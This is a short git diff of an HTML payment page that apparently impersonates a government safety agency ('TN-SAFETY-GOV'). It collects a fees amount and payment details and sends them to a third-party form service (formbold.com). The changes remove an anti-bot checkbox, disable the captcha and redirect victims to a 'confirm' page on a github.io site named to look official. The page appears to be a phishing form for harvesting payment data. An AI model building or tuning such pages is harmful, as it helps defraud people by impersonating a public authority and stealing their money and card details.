@@ -57,13 +57,12 @@
         </div>
         <form action="https://formbold.com/s/oDKEX" method="POST">
 
-            <input type="hidden" name="access_key" value="5e488ef0-1fb5-4d78-aa5f-9a9eea9e82fb">
-            <input type="hidden" name="from_name" value="TN-SAFETY-GOV">
-            <input type="hidden" name="subject" value="Paiement - Tableau">
+        <!-- 1. Désactiver le captcha -->
+        <input type="hidden" name="_captcha" value="false">
 
-            <input type="checkbox" name="botcheck" style="display:none">
-
-     
+        <!-- 2. Rediriger après l'envoi vers ta page merci -->
+        <input type="hidden" name="_redirect" value="https://tn-safety-tn-gov.github.io/tn-safety-tn-gov/confirm.html">
+            
             <!-- payment amount -->
             <div class="form-group">
                 <label>Fees amount</label>
@@ -112,8 +111,6 @@
                     <i class="fa-solid fa-cicle-question">?</i>
                 </div>
             </div>
-            <!-- Redirection vers votre page personnalisée -->
-            <input type="hidden" name="redirect" value="https://tn-safety-tn-gov.github.io/tn-safety-tn-gov/confirm.html">
             <!-- Bouton de validation -->
             <button type="submit" class="pay-btn">
                 <i class="fa-solid fa-lock"><img src="images/lock.jpg"></i>  Payment
